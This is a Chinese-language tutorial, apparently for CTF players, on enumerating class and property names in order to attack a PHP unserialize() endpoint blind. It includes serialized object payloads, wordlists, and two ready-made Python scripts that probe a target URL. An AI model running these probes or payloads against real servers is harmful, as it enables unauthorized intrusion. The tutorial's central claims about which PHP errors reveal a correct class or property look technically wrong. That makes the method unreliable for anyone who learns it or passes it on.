# 💥 为什么要爆破类名？

在 PHP 反序列化攻击 (`unserialize`) 里，如果服务器有一段类似：

```php
$p = $_GET['p'];
unserialize($p);
```

但是**不给你源码**，你就不知道反序列化的**类名（class name）**是什么，无法直接构造 payload。

⚡ 这时候，就要 **"爆破" 类名**，找到服务器存在的敏感类。

一旦猜中类名，触发魔术方法（如 `__destruct()`），就可能直接 RCE、拿 Flag、打通一条利用链！

------

# 🎯 核心爆破思路

**传一个假的 payload，观察服务器反应！**

传输：

```php
p=O:<类名长度>:"<类名>":0:{}
```

- 如果类名正确：服务器可能报别的错（比如属性不存在），或者直接执行魔术方法。
- 如果类名错误：一般直接报错 `"unserialize(): Error at offset..."`，因为 PHP 找不到这个类。

**通过不同的报错信息，判断类名是否正确！**

------

# 🛠 手动爆破示范

假设猜测类名是 `Admin`，那么 payload 是：

```css
O:5:"Admin":0:{}
```

其中：

- `O` ：表示对象
- `5` ：类名长度（`Admin` 五个字母）
- `"Admin"` ：类名
- `0` ：对象里有0个属性
- `{}` ：空属性表

然后访问：

```php
http://target.com/vuln.php?p=O:5:"Admin":0:{}
```

观察服务器返回的错误信息：

- 如果是 `unserialize(): Error at offset 10...` → 说明可能类不存在（类名错了）
- 如果是别的报错，比如 `Trying to access property on null` → 有戏，类名可能对了！！

------

# 📚 常用爆破字典（超实用）



| 类名    | 说明                   |
| ------- | ---------------------- |
| Admin   | 管理员                 |
| admin   | 小写管理员             |
| User    | 用户                   |
| user    | 小写用户               |
| Login   | 登录                   |
| login   | 小写登录               |
| Manager | 管理者                 |
| manager | 小写管理者             |
| Member  | 成员                   |
| member  | 小写成员               |
| Guest   | 访客                   |
| guest   | 小写访客               |
| Wllm    | 题目中自定义的奇怪名字 |
| wllm    | 小写版                 |

**实战建议：**

- 先爆破常见的简单类名（Admin/User/Login）
- 再爆破小写版（PHP文件名通常小写）
- 再根据 URL、提示词、页面字眼推测（比如有 /admin.php 就试 Admin）
- 如果有源码片段，留意命名习惯，比如题目给了 `$this->admin`，那类名可能和 "admin" 有关！

------

# 🔥 自动化爆破

你可以写个简单的 Python 脚本来爆破，例如：

```python
import requests

url = "http://target.com/vuln.php"
class_list = ["Admin", "admin", "User", "user", "Login", "login", "Manager", "manager"]

for classname in class_list:
    payload = f'O:{len(classname)}:"{classname}":0:{{}}'
    r = requests.get(url, params={"p": payload})
    if "offset" not in r.text:  # 如果没有出现 offset 报错，说明可能成功了
        print(f"[*] Possible class found: {classname}")
```

这样就可以批量尝试，自动检测啦！

------

# ⚡ 一句话总结

爆破类名 = **传不同的类名对象 → 看返回错误信息 → 判断是否存在**

# 🔥 爆破 **属性名**（变量名）

------

## 🎯 为什么要爆破属性名？

因为在 PHP `unserialize()` 时，不光需要正确的**类名**，
 有些魔术方法（比如 `__destruct`，`__wakeup`）还需要**特定的属性赋值**，才能成功触发漏洞。

如果属性名字你不知道，就算类名猜对了，也没办法用。

**所以：**

- 类名爆破 → 属性名爆破 → 完整构造 payload！

------

## 🛠 爆破属性名的方法

**核心套路**：

给这个类**随便塞一个属性**，看报错反应！

- 如果属性名不存在，PHP 报：

  ```php
  Undefined property: xxx::$属性名
  ```

- 如果属性名存在了，就不会报 Undefined。

**通过是否报 Undefined property，推测属性名对不对！**

------

## 📚 常见的属性名爆破字典



| 属性名   | 说明             |
| -------- | ---------------- |
| admin    | 管理员           |
| user     | 用户名           |
| passwd   | 密码             |
| password | 密码             |
| username | 用户名           |
| flag     | 常见的 flag 变量 |
| id       | 用户 id          |
| role     | 角色             |
| auth     | 权限             |
| session  | 会话             |
| token    | 令牌             |

（有些比赛出的题习惯用很短的，比如 `a`, `b`, `p`, `u`，可以一起带进去爆破）

------

## 🧩 手动爆破示范

假设你已经爆破出类名是 `Admin`。
 现在要爆破属性名，可以构造 payload：

```php
O:5:"Admin":1:{s:5:"admin";s:5:"admin";}
```

解释一下：

- `O:5:"Admin"` ：对象是 Admin，类名 5 个字符
- `1` ：有1个属性
- `{s:5:"admin";s:5:"admin";}` ：属性名是 `"admin"`，值是 `"admin"`

然后发过去：

```php
http://target.com/vuln.php?p=O:5:"Admin":1:{s:5:"admin";s:5:"admin";}
```

如果返回：

```php
Undefined property: Admin::$admin
```

说明属性不存在，需要换一个属性名。

如果不报 Undefined property，就可能猜对了！

------

## ⚡ 自动爆破属性名脚本（送你一份现成的）

```python
import requests

url = "http://target.com/vuln.php"
classname = "Admin"
props = ["admin", "user", "passwd", "password", "username", "id", "role"]

for prop in props:
    payload = f'O:{len(classname)}:"{classname}":1:{{s:{len(prop)}:"{prop}";s:5:"admin";}}'
    r = requests.get(url, params={"p": payload})
    if "Undefined property" not in r.text:
        print(f"[*] Possible property found: {prop}")
```

**原理就是**爆一次，看一次页面返回有没有 `Undefined property`，过滤掉不对的。

------

## 🚀 高级打法：一边爆破类名一边爆破属性名！

如果你啥都不知道，可以一开始就：

- 对每个类名，配一堆常见属性名。
- 组合着一起爆。

这样速度更快！！

------

# 📣 总结口诀

> 类名先爆破，属性跟着扫。
>  不报 offset 错，继续抓 property。
>  连起来一起构造，打穿服务器！